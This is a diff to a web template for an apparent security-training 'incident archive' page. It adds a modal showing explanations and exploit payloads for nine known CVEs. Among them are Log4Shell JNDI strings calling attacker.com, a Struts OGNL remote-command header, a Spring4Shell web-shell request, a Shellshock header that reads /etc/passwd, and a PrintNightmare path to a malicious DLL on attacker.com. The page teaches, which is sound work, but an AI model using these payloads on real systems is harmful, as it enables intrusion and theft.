@@ -3,10 +3,85 @@
 {% block title %}Securithon Lab | Incident Archive{% endblock %}
 
 {% block extra_css %}
-<link rel="stylesheet" href="{{ url_static('css/pages/archive.css') }}">
+<link rel="stylesheet" href="{{ url_static('css/pages/archive.css') }}?v=5">
 {% endblock %}
 
 {% block content %}
+{% set incidents = [
+    {
+        "title": "Spring4Shell",
+        "severity": "CRITICAL",
+        "year": "2022",
+        "cve": "CVE-2022-22965",
+        "desc": "Spring Framework RCE vulnerability via ClassLoader manipulation in Spring MVC applications deployed on Tomcat under specific configurations.",
+        "cvss": "CVSS 9.8"
+    },
+    {
+        "title": "Log4Shell",
+        "severity": "CRITICAL",
+        "year": "2021",
+        "cve": "CVE-2021-44228",
+        "desc": "Apache Log4j2 JNDI lookup feature exploited for remote code execution via crafted log messages. Bypassed typical WAFs due to deep application integration.",
+        "cvss": "CVSS 10.0"
+    },
+    {
+        "title": "PrintNightmare",
+        "severity": "CRITICAL",
+        "year": "2021",
+        "cve": "CVE-2021-34527",
+        "desc": "Windows Print Spooler service remote code execution allowing privilege escalation to SYSTEM via malicious driver installation.",
+        "cvss": "CVSS 8.8"
+    },
+    {
+        "title": "SolarWinds Sunburst",
+        "severity": "CRITICAL",
+        "year": "2020",
+        "cve": "Supply Chain Attack",
+        "desc": "State-sponsored hackers compromised the SolarWinds Orion build pipeline, injecting a backdoor (Sunburst) into legitimate software updates distributed to thousands of enterprises.",
+        "cvss": "N/A (APT)"
+    },
+    {
+        "title": "EternalBlue",
+        "severity": "CRITICAL",
+        "year": "2017",
+        "cve": "CVE-2017-0144",
+        "desc": "SMBv1 buffer overflow vulnerability used by WannaCry ransomware to spread across networks laterally without user interaction.",
+        "cvss": "CVSS 9.8"
+    },
+    {
+        "title": "Equifax Data Breach",
+        "severity": "CRITICAL",
+        "year": "2017",
+        "cve": "CVE-2017-5638",
+        "desc": "Apache Struts 2 vulnerability allowed attackers to execute remote commands via crafted Content-Type headers, leading to the theft of 147 million records.",
+        "cvss": "CVSS 10.0"
+    },
+    {
+        "title": "Dirty COW",
+        "severity": "HIGH",
+        "year": "2016",
+        "cve": "CVE-2016-5195",
+        "desc": "A race condition in the Linux kernel's memory subsystem (Copy-On-Write) allowed local users to gain root privileges by writing to read-only memory mappings.",
+        "cvss": "CVSS 7.8"
+    },
+    {
+        "title": "Heartbleed",
+        "severity": "HIGH",
+        "year": "2014",
+        "cve": "CVE-2014-0160",
+        "desc": "OpenSSL TLS heartbeat extension allowed reading of server memory, leaking private keys and user data. A fundamental failure in buffer bounds checking.",
+        "cvss": "CVSS 7.5"
+    },
+    {
+        "title": "Shellshock",
+        "severity": "CRITICAL",
+        "year": "2014",
+        "cve": "CVE-2014-6271",
+        "desc": "Bash shell allowed executing commands in environment variables, exploitable via CGI web servers, SSH forced commands, and DHCP clients.",
+        "cvss": "CVSS 9.8"
+    }
+] %}
+
 <main id="elite-archive">
     <div class="archive-container">
         <header class="archive-header">
@@ -19,108 +94,117 @@
         </header>
 
         <div class="archive-grid" role="list">
-            <!-- Log4Shell -->
-            <article class="glass-panel incident-card critical" role="listitem">
-                <div class="card-header">
-                    <span class="severity-pill">CRITICAL</span>
-                    <span class="t-mono">2021</span>
-                </div>
-                <h2 class="t-header incident-title">Log4Shell</h2>
-                <div class="incident-meta">
-                    <span class="t-mono"><i class="fas fa-bug"></i> CVE-2021-44228</span>
-                </div>
-                <p class="incident-desc">Apache Log4j2 JNDI lookup feature exploited for remote code execution via crafted log messages. Bypassed typical web application firewalls due to deep integration.</p>
-                <div class="card-footer">
-                    <span class="t-mono">CVSS 10.0</span>
-                    <a href="#" class="btn-review">Analyze Payload</a>
-                </div>
-            </article>
-
-            <!-- Heartbleed -->
-            <article class="glass-panel incident-card high" role="listitem">
-                <div class="card-header">
-                    <span class="severity-pill">HIGH</span>
-                    <span class="t-mono">2014</span>
-                </div>
-                <h2 class="t-header incident-title">Heartbleed</h2>
-                <div class="incident-meta">
-                    <span class="t-mono"><i class="fas fa-bug"></i> CVE-2014-0160</span>
-                </div>
-                <p class="incident-desc">OpenSSL TLS heartbeat extension allowed reading of server memory, leaking private keys and user data. A fundamental failure in buffer bounds checking.</p>
-                <div class="card-footer">
-                    <span class="t-mono">CVSS 7.5</span>
-                    <a href="#" class="btn-review">Analyze Payload</a>
-                </div>
-            </article>
-
-            <!-- EternalBlue -->
-            <article class="glass-panel incident-card critical" role="listitem">
-                <div class="card-header">
-                    <span class="severity-pill">CRITICAL</span>
-                    <span class="t-mono">2017</span>
-                </div>
-                <h2 class="t-header incident-title">EternalBlue</h2>
-                <div class="incident-meta">
-                    <span class="t-mono"><i class="fas fa-bug"></i> CVE-2017-0144</span>
-                </div>
-                <p class="incident-desc">SMBv1 buffer overflow vulnerability used by WannaCry ransomware to spread across networks laterally without user interaction.</p>
-                <div class="card-footer">
-                    <span class="t-mono">CVSS 9.8</span>
-                    <a href="#" class="btn-review">Analyze Payload</a>
-                </div>
-            </article>
-
-            <!-- PrintNightmare -->
-            <article class="glass-panel incident-card critical" role="listitem">
-                <div class="card-header">
-                    <span class="severity-pill">CRITICAL</span>
-                    <span class="t-mono">2021</span>
-                </div>
-                <h2 class="t-header incident-title">PrintNightmare</h2>
-                <div class="incident-meta">
-                    <span class="t-mono"><i class="fas fa-bug"></i> CVE-2021-34527</span>
-                </div>
-                <p class="incident-desc">Windows Print Spooler service remote code execution allowing privilege escalation to SYSTEM via malicious driver installation.</p>
-                <div class="card-footer">
-                    <span class="t-mono">CVSS 8.8</span>
-                    <a href="#" class="btn-review">Analyze Payload</a>
-                </div>
-            </article>
-
-            <!-- Spring4Shell -->
-            <article class="glass-panel incident-card critical" role="listitem">
-                <div class="card-header">
-                    <span class="severity-pill">CRITICAL</span>
-                    <span class="t-mono">2022</span>
-                </div>
-                <h2 class="t-header incident-title">Spring4Shell</h2>
-                <div class="incident-meta">
-                    <span class="t-mono"><i class="fas fa-bug"></i> CVE-2022-22965</span>
-                </div>
-                <p class="incident-desc">Spring Framework RCE vulnerability via ClassLoader manipulation in Spring MVC applications deployed on Tomcat under specific configurations.</p>
-                <div class="card-footer">
-                    <span class="t-mono">CVSS 9.8</span>
-                    <a href="#" class="btn-review">Analyze Payload</a>
-                </div>
-            </article>
-
-            <!-- Shellshock -->
-            <article class="glass-panel incident-card critical" role="listitem">
-                <div class="card-header">
-                    <span class="severity-pill">CRITICAL</span>
-                    <span class="t-mono">2014</span>
-                </div>
-                <h2 class="t-header incident-title">Shellshock</h2>
-                <div class="incident-meta">
-                    <span class="t-mono"><i class="fas fa-bug"></i> CVE-2014-6271</span>
-                </div>
-                <p class="incident-desc">Bash shell allowed executing commands in environment variables, exploitable via CGI web servers, SSH forced commands, and DHCP clients.</p>
-                <div class="card-footer">
-                    <span class="t-mono">CVSS 9.8</span>
-                    <a href="#" class="btn-review">Analyze Payload</a>
-                </div>
-            </article>
+            {% for incident in incidents %}
+                {% include "components/archive/incident_card.html" %}
+            {% endfor %}
         </div>
     </div>
 </main>
+
+<!-- Payload Analysis Modal -->
+<div id="payloadModal" class="modal-overlay" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); z-index: 9999; display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.4s;">
+    <div class="modal-content glass-panel" style="width: 90%; max-width: 700px; background: rgba(13, 17, 23, 0.95); border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 0 40px rgba(0, 0, 0, 0.8); transform: translateY(20px); transition: all 0.4s; opacity: 0; border-radius: 8px; overflow: hidden;">
+        <div class="modal-header" style="padding: 16px 24px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); display: flex; justify-content: space-between; align-items: center; background: rgba(255, 255, 255, 0.02);">
+            <h2 id="pm-title" class="t-header" style="margin: 0; font-size: 1.1rem; color: #58a6ff;"><i class="fas fa-microscope"></i> PAYLOAD ANALYSIS: <span></span></h2>
+            <button class="btn-close" onclick="closePayloadModal()" style="background: transparent; border: none; color: rgba(255, 255, 255, 0.4); font-size: 1.2rem; cursor: pointer;"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="modal-body" style="padding: 24px; display: flex; flex-direction: column; gap: 20px;">
+            <div class="explanation-box" style="background: rgba(255,255,255,0.02); padding: 16px; border-left: 3px solid #58a6ff; border-radius: 0 4px 4px 0;">
+                <p id="pm-explanation" class="t-mono" style="margin: 0; font-size: 0.85rem; color: rgba(255,255,255,0.8); line-height: 1.6;"></p>
+            </div>
+            <div class="code-box" style="background: #0d1117; padding: 16px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.05); overflow-x: auto;">
+                <pre style="margin: 0;"><code id="pm-code" class="t-mono" style="color: #f85149; font-size: 0.85rem;"></code></pre>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const payloadData = {
+        "Log4Shell": {
+            explanation: "The vulnerability occurs when Log4j2 parses a crafted log string containing a JNDI (Java Naming and Directory Interface) lookup. By directing the lookup to an attacker-controlled LDAP server, the server downloads and executes a malicious Java class file.",
+            code: "${jndi:ldap://attacker.com/ExploitClass}\n\n// Obfuscated variants:\n${jndi:${lower:l}${lower:d}ap://attacker.com/a}\n${jndi:dns://attacker.com/dns-exfiltration}"
+        },
+        "Heartbleed": {
+            explanation: "The attacker sends a crafted TLS Heartbeat Request with a payload of 1 byte but claims the payload length is 65535 bytes (64KB). The vulnerable OpenSSL server copies 64KB from memory (including private keys, session tokens) and sends it back to the attacker.",
+            code: "/* Structure of a Heartbeat Request */\nstruct {\n   HeartbeatMessageType type; // 1 byte (0x01 for request)\n   uint16 payload_length;     // Claimed length (e.g., 65535)\n   opaque payload[HeartbeatMessage.payload_length];\n   opaque padding[padding_length];\n} HeartbeatMessage;"
+        },
+        "EternalBlue": {
+            explanation: "EternalBlue exploits a buffer overflow in Microsoft's SMBv1 server implementation (srv.sys). It sends crafted packets that trigger a math error (integer underflow) when allocating memory for OS2FEA structures, allowing remote arbitrary code execution in the kernel space.",
+            code: "# Sending the crafted SMB packet to trigger the overflow\nsmb_packet = (\n    b'\\x00\\x00\\x00\\x31' # NetBIOS Session Service\n    b'\\xff\\x53\\x4d\\x42' # SMB Header\n    b'\\x32\\x00\\x00\\x00' # Trans2 Command\n    # ... Malicious OS2FEA structure ...\n)\nsocket.send(smb_packet)"
+        },
+        "Equifax Data Breach": {
+            explanation: "Apache Struts 2 allowed unauthenticated attackers to evaluate arbitrary Object-Graph Navigation Language (OGNL) expressions. Attackers injected the OGNL expression into the HTTP 'Content-Type' header, causing the server to execute system commands.",
+            code: "POST /action HTTP/1.1\nHost: target.com\nContent-Type: %{" + "#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Pwned', 'Yes')}\n\n// Or for RCE:\nContent-Type: %{(" + "#_='multipart/form-data').(" + "#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(" + "#_memberAccess?(" + "#_memberAccess=" + "#dm):((" + "#container=" + "#context['com.opensymphony.xwork2.ActionContext.container']).(" + "#ognlUtil=" + "#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(" + "#ognlUtil.getExcludedPackageNames().clear()).(" + "#ognlUtil.getExcludedClasses().clear()).(" + "#context.setMemberAccess(" + "#dm)))).(" + "#cmd='whoami').(" + "#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(" + "#cmds=(" + "#iswin?{'cmd.exe','/c'," + "#cmd}:{'/bin/bash','-c'," + "#cmd})).(" + "#p=new java.lang.ProcessBuilder(" + "#cmds)).(" + "#p.redirectErrorStream(true)).(" + "#process=" + "#p.start()).(" + "#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(" + "#process.getInputStream()," + "#ros)).(" + "#ros.flush())}"
+        },
+        "SolarWinds Sunburst": {
+            explanation: "Attackers compromised the build environment of SolarWinds Orion. They inserted a backdoor into the 'SolarWinds.Orion.Core.BusinessLayer.dll' library before it was digitally signed. Once installed, the DLL waited 12-14 days before reaching out to a C2 domain (avsvmcloud[.]com) to download secondary payloads.",
+            code: "// Decompiled snippet from the compromised DLL\nif (num > 288 && num < 336) {\n   // Wait period elapsed\n   string domain = this.GetOrCreateDomain(); \n   IPHostEntry hostEntry = Dns.GetHostEntry(domain);\n   // If Dns check passes, execute Http request for instructions\n   this.ExecuteBackdoor(hostEntry);\n}"
+        },
+        "Dirty COW": {
+            explanation: "A race condition in the Linux kernel. A local unprivileged attacker could exploit the way the kernel handles copy-on-write (COW) functionality of read-only memory mappings to write data to a read-only file (like /etc/passwd), thereby gaining root access.",
+            code: "void *madviseThread(void *arg) {\n  char *str = (char*)arg;\n  for(int i = 0; i < 100000000; i++) {\n    /* Advise kernel to free the memory page */\n    madvise(map, 100, MADV_DONTNEED);\n  }\n}\n\n// Concurrently writing to /proc/self/mem bypasses permissions\nlseek(f, 0, SEEK_SET);\nwrite(f, \"root::0:0:root:/root:/bin/bash\\n\", 31);"
+        },
+        "PrintNightmare": {
+            explanation: "The vulnerability lies in the RpcAddPrinterDriverEx() function. A low-privileged user can call this function to install a malicious printer driver on the domain controller or server. The spooler service (running as SYSTEM) loads and executes the malicious driver DLL.",
+            code: "import dcerpc\n\n# Call RpcAddPrinterDriverEx over SMB/RPC\nrequest = rprn.RpcAddPrinterDriverEx()\nrequest['pName'] = '\\\\\\\\192.168.1.10'\nrequest['pDriverContainer']['DriverInfo']['Level'] = 2\nrequest['pDriverContainer']['DriverInfo']['DriverInfo2']['pDriverPath'] = '\\\\\\\\attacker.com\\\\share\\\\malicious.dll'\n\n# The service runs the DLL as SYSTEM\ndcerpc.send(request)"
+        },
+        "Spring4Shell": {
+            explanation: "In Java 9+, the 'class.module.classLoader' is accessible via request binding. An attacker can send a request altering Tomcat's logging configuration properties (e.g., changing the log file suffix to '.jsp' and the directory to the web root), allowing them to write a JSP web shell.",
+            code: "POST /spring-app/ HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di\n&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\n&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\n&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell\n&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+        },
+        "Shellshock": {
+            explanation: "An issue in Bash's parsing of environment variables. If an environment variable's value begins with '() {', Bash evaluates the following commands when initializing. Web servers using CGI expose HTTP headers as environment variables, enabling remote execution.",
+            code: "GET /cgi-bin/status HTTP/1.1\nHost: target.com\nUser-Agent: () { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd\n\n# Bash evaluates the User-Agent as a function, then blindly executes the appended payload."
+        }
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const modal = document.getElementById('payloadModal');
+        const content = modal.querySelector('.modal-content');
+        const titleEl = document.getElementById('pm-title').querySelector('span');
+        const explEl = document.getElementById('pm-explanation');
+        const codeEl = document.getElementById('pm-code');
+
+        document.querySelectorAll('.incident-card').forEach(card => {
+            const title = card.querySelector('.incident-title').innerText.trim();
+            const btn = card.querySelector('.btn-review');
+            
+            btn.addEventListener('click', (e) => {
+                e.preventDefault();
+                const data = payloadData[title] || { explanation: "Payload analysis not available.", code: "// NO DATA" };
+                
+                titleEl.innerText = title;
+                explEl.innerText = data.explanation;
+                codeEl.innerText = data.code;
+                
+                modal.style.opacity = '1';
+                modal.style.pointerEvents = 'auto';
+                content.style.opacity = '1';
+                content.style.transform = 'translateY(0)';
+            });
+        });
+
+        window.closePayloadModal = () => {
+            modal.style.opacity = '0';
+            modal.style.pointerEvents = 'none';
+            content.style.opacity = '0';
+            content.style.transform = 'translateY(20px)';
+        };
+
+        // Close modal when clicking the overlay background
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                closePayloadModal();
+            }
+        });
+
+        // Close modal when pressing Escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closePayloadModal();
+            }
+        });
+    });
+</script>
 {% endblock %}
